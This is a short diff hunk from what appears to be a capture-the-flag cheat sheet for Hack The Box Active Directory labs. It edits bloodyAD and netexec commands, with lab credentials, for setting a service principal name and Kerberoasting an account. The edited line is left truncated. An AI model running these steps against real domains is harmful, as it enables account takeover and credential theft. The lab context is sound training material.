@@ -1741,7 +1741,7 @@ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord 
 ```
 bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
 
-netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hashLDAP        dc.voleur.htb   389    DC
+netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoast -
 ```
   
 </details>
